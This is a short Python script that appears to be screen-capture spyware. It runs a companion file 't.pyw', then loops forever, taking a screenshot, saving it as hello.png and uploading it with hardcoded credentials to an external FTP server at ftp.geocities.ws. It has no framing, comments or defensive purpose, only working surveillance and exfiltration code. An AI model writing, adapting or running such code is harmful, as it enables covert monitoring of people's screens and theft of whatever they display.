import time
import pyscreenshot
import ftplib
time.sleep(5)
execfile('t.pyw')
while True:
	pyscreenshot.grab()
	pyscreenshot.grab_to_file('hello.png')
	session = ftplib.FTP('ftp.geocities.ws','sefgfaulted','wepartyrock')
	file = open('hello.png','rb')
	session.storbinary('STOR hello.png', file)	
	session.quit()
